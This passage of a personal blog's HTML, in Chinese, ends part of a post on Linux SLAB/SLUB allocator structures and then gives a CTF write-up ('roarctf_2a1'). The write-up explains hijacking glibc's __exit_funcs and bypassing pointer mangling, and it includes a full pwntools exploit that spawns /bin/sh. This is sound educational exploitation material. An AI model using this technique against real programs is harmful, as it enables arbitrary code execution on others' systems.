class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_partial</span>;</span>	<span class="comment">/* partial list first, better asm code */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_full</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_free</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> total_slabs;	<span class="comment">/* length of all slab lists */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> free_slabs;	<span class="comment">/* length of free slab list only */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> free_objects;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> free_limit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> colour_next;	<span class="comment">/* Per-node cache coloring */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">shared</span>;</span>	<span class="comment">/* shared per node */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">alien_cache</span> **<span class="title">alien</span>;</span>	<span class="comment">/* on other nodes */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> next_reap;	<span class="comment">/* updated without locking */</span></span><br><span class="line">	<span class="keyword">int</span> free_touched;		<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> nr_partial;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span> nr_slabs;</span><br><span class="line">	<span class="keyword">atomic_long_t</span> total_objects;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>struct array_cache __percpu *cpu_cache</code></p>
<p>这个结构是管理被释放的obj的块，entry中的每一项指向被释放的对象。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * struct array_cache</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Purpose:</span></span><br><span class="line"><span class="comment"> * - LIFO ordering, to hand out cache-warm objects from _alloc</span></span><br><span class="line"><span class="comment"> * - reduce the number of linked list operations</span></span><br><span class="line"><span class="comment"> * - reduce spinlock operations</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The limit is stored in the per-cpu structure to reduce the data cache</span></span><br><span class="line"><span class="comment"> * footprint.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> avail;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> limit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> batchcount;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> touched;</span><br><span class="line">	<span class="keyword">void</span> *entry[];	<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Must have this definition in here for the proper</span></span><br><span class="line"><span class="comment">			 * alignment of array_cache. Also simplifies accessing</span></span><br><span class="line"><span class="comment">			 * the entries.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>page中的void <em>s_mem指向slab中的第一个obj;void </em>freelist;指向第一个free的obj</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span>	<span class="comment">/* slab, slob and slub */</span></span><br><span class="line">			<span class="keyword">union</span> &#123;</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> &#123;</span>	<span class="comment">/* Partial pages */</span></span><br><span class="line">					<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">					<span class="keyword">int</span> pages;	<span class="comment">/* Nr of pages left */</span></span><br><span class="line">					<span class="keyword">int</span> pobjects;	<span class="comment">/* Approximate count */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">					<span class="keyword">short</span> <span class="keyword">int</span> pages;</span><br><span class="line">					<span class="keyword">short</span> <span class="keyword">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">				&#125;;</span><br><span class="line">			&#125;;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span> <span class="comment">/* not slob */</span></span><br><span class="line">			<span class="comment">/* Double-word boundary */</span></span><br><span class="line">			<span class="keyword">void</span> *freelist;		<span class="comment">/* first free object */</span></span><br><span class="line">			<span class="keyword">union</span> &#123;</span><br><span class="line">				<span class="keyword">void</span> *s_mem;	<span class="comment">/* slab: first object */</span></span><br><span class="line">				<span class="keyword">unsigned</span> <span class="keyword">long</span> counters;		<span class="comment">/* SLUB */</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> &#123;</span>			<span class="comment">/* SLUB */</span></span><br><span class="line">					<span class="keyword">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">					<span class="keyword">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">					<span class="keyword">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">				&#125;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="SLUB"><a href="#SLUB" class="headerlink" title="SLUB"></a>SLUB</h4><p>用来管理被释放的obj</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> **freelist;	<span class="comment">/* Pointer to next available object */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> tid;	<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span>	<span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span>	<span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">	<span class="keyword">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/12/07/roarctf-2a1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="xkaneiki">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xkaneiki's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2020/12/07/roarctf-2a1/" class="post-title-link" itemprop="url">roarctf_2a1</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-12-07 10:51:24 / Modified: 22:54:10" itemprop="dateCreated datePublished" datetime="2020-12-07T10:51:24+08:00">2020-12-07</time>
            

            
              

              
            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="2a1"><a href="#2a1" class="headerlink" title="2a1"></a>2a1</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/2020/12/07/roarctf-2a1/截屏2020-12-07 上午10.54.30.png" alt="截屏2020-12-07 上午10.54.30"></p>
<p>程序的主要功能有3个：</p>
<ul>
<li><p>程序首先会给你alarm的地址，用它可以求出libc的基址</p>
</li>
<li><p>程序会讲你指定的地址上的八个字节输出出来</p>
</li>
<li><p>你先制定一个地址，程序申请0x30的堆栈空间，你可以向里面输入东西，然后程序通过30行的*v8=v9将堆地址写到你制定的地址上</p>
</li>
</ul>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>一开始想伪造vtable，利用IO_overflow来执行gadget，后来发现没发饶过执行IO_overflow的条件。请教了学长之后才有了思路。</p>
<p>程序正常退出时或exit时会执行__run_exit_handlers函数，这个函数里面有东西可以利用。查看glibc的源码，可以看到struct exit_function_list <em>cur = </em>listp;，我们可以通过劫持这个指针，因为这个指针指向的结构体里面有函数指针并且之后的步骤会执行case ef_cxa:cxafct = f-&gt;func.cxa.fn;，我们可以利用此来执行system(‘/bin/sh’)获得shell。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="keyword">int</span> status, struct exit_function_list **listp,</span><br><span class="line">		     <span class="keyword">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit' and `on_exit'. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> = *<span class="title">listp</span>;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span></span><br><span class="line"><span class="class">	    &amp;<span class="title">cur</span>-&gt;<span class="title">fns</span>[--<span class="title">cur</span>-&gt;<span class="title">idx</span>];</span></span><br><span class="line">	  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">void</span> (*atfct) (<span class="keyword">void</span>);</span><br><span class="line">	      <span class="keyword">void</span> (*onfct) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</span><br><span class="line">	      <span class="keyword">void</span> (*cxafct) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">case</span> ef_free:</span><br><span class="line">	    <span class="keyword">case</span> ef_us:</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_on:</span><br><span class="line">	      onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      onfct (status, f-&gt;func.on.arg);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_at:</span><br><span class="line">	      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      atfct ();</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">	      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">	<span class="comment">/* Don't free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">	   allocate element.  */</span></span><br><span class="line">	<span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看一下这个结构体的结构，我们劫持了cur指针就能够指向我们伪造的exit_function_list，由于可以想任意的地址写上堆地址，我们可以覆盖cur指针为堆地址，将fn设置为system，将arg设置为/bin/sh，然后执行cxafct (f-&gt;func.cxa.arg, status);就够获得shell了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour' should be of type of the `enum' above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int'.  */</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> flavor;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">      &#123;</span><br><span class="line">	<span class="keyword">void</span> (*at) (<span class="keyword">void</span>);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">	  &#123;</span></span><br><span class="line">	    <span class="keyword">void</span> (*fn) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</span><br><span class="line">	    <span class="keyword">void</span> *arg;</span><br><span class="line">	  &#125; on;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">	  &#123;</span></span><br><span class="line">	    <span class="keyword">void</span> (*fn) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</span><br><span class="line">	    <span class="keyword">void</span> *arg;</span><br><span class="line">	    <span class="keyword">void</span> *dso_handle;</span><br><span class="line">	  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
<p>接下来我们进行调试，在__run_exit_handlers设置下断点，看看这个函数的执行情况。</p>
<p><img src="/2020/12/07/roarctf-2a1/截屏2020-12-07 下午3.26.07.png" alt="截屏2020-12-07 下午3.26.07"></p>
<p>参考源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line"><span class="built_in">exit</span> (<span class="keyword">int</span> status)</span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数的第二个参数即rsi是&amp;__exit_funcs，则rbp是固定的值即&amp;__exit_funcs，而r13的值是通过rbp取址的，从而如果我们能够改写__exit_funcs的内容则就能偶控制r13。</p>
<p><img src="/2020/12/07/roarctf-2a1/截屏2020-12-07 下午3.31.36.png" alt="截屏2020-12-07 下午3.31.36"></p>
<p>从这里可以看出r13存储的就是lisp，我们利用程序的在任意地址写上我们申请的堆地址的功能，将堆地址写到&amp;__exit_funcs处，从而就能够劫持cur。</p>
<p>由于我们可以往堆内写任意的内容，我们按照exit_function_list结构体将idx设置为0，将fns[0].flavor设置为4，函数就会跳过去执行一下内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ef_cxa:</span><br><span class="line">	      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      cxafct (f-&gt;func.cxa.arg, status);</span><br></pre></td></tr></table></figure>
<p>我们再设置f-&gt;func.cxa.fn和f-&gt;func.cxa.arg就能够完成劫持，但是这里的函数地址是要经过一些操作才能获得的，进入gdb我们看看具体是什么</p>
<p><img src="/2020/12/07/roarctf-2a1/截屏2020-12-07 下午3.40.41.png" alt="截屏2020-12-07 下午3.40.41"></p>
<p>在call之前，函数地址会现经过循环右移0x11，再和fs:[0x30]异或。想要控制调用的函数就知道fs:[0x30]的值。可以利用之前读任意地址的操作获得，现在的问题是fs[0x30]指向哪里？参考<a href="https://stackoverflow.com/questions/23095665/using-gdb-to-read-msrs" target="_blank" rel="noopener">这篇回答</a>，在gdb中输入call arch_prctl(0x1003, $rsp - 0x8)然后再 x /gx $rsp - 0x8打印出结果，计算出fs:[0x30]和libc的相对偏移；<img src="/2020/12/07/roarctf-2a1/截屏2020-12-07 下午10.50.32.png" alt="截屏2020-12-07 下午10.50.32"></p>
<p>根据相对偏移利用之前的任意读读出fs:[0x30]中的内容guard，要想再经过ror和xor操作后得到正确system地址，只需要将system地址先进行xor然后再进行循rol循环左移就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROL((gadget+libc)^guard,<span class="number">0x11</span>)</span><br></pre></td></tr></table></figure>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span><span class="params">(data, shift, size=<span class="number">64</span>)</span>:</span></span><br><span class="line">    shift %= size</span><br><span class="line">    remains = data &gt;&gt; (size - shift)</span><br><span class="line">    body = (data &lt;&lt; shift) - (remains &lt;&lt; size)</span><br><span class="line">    <span class="keyword">return</span> (body + remains)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./2+1'</span>)</span><br><span class="line">le = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">gadget = le.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">' dir ../glibc-2.23/io\n'</span></span><br><span class="line">cmd += <span class="string">' dir ../glibc-2.23/libio\n'</span></span><br><span class="line">cmd += <span class="string">'dir ../glibc-2.23/stdlib\n'</span></span><br><span class="line"><span class="comment"># cmd += 'b _IO_flush_all_lockp\n'</span></span><br><span class="line"><span class="comment"># cmd += 'b __cxa_thread_atexit_impl\n'</span></span><br><span class="line"><span class="comment"># cmd += 'b __call_tls_dtors\n'</span></span><br><span class="line">cmd += <span class="string">'b __run_exit_handlers\n'</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Gift: "</span>)</span><br><span class="line">libc = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>], <span class="number">16</span>)-le.sym[<span class="string">'alarm'</span>]</span><br><span class="line">print(<span class="string">'libc'</span>, hex(libc))</span><br><span class="line">print(hex(gadget+libc))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># t = libc + le.sym['environ']</span></span><br><span class="line">t = libc+<span class="number">0x5df730</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"where to read?:"</span>)</span><br><span class="line">p.send(p64(t))</span><br><span class="line">p.recvuntil(<span class="string">"data: "</span>)</span><br><span class="line">guard=u64(p.recvn(<span class="number">8</span>))</span><br><span class="line">print(<span class="string">'guard'</span>, hex(guard))</span><br><span class="line">print(<span class="string">"t"</span>, hex(t))</span><br><span class="line"></span><br><span class="line">t=libc + <span class="number">0x7f3de3c355f8</span><span class="number">-0x7f3de3871000</span></span><br><span class="line">p.recvuntil(<span class="string">"where to write?:"</span>)</span><br><span class="line">p.send(p64(t))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"msg: "</span>)</span><br><span class="line">sh = libc+<span class="number">0x18CE17</span></span><br><span class="line">payload= p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">4</span>)+p64(ROL((gadget+libc)^guard,<span class="number">0x11</span>))+p64(sh)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/23/xyb-babydev/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="xkaneiki">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xkaneiki's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2020/11/23/xyb-babydev/" class="post-title-link" itemprop="url">xyb_babydev</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-11-23 20:45:35" itemprop="dateCreated datePublished" datetime="2020-11-23T20:45:35+08:00">2020-11-23</time>
            

            
              

              
                
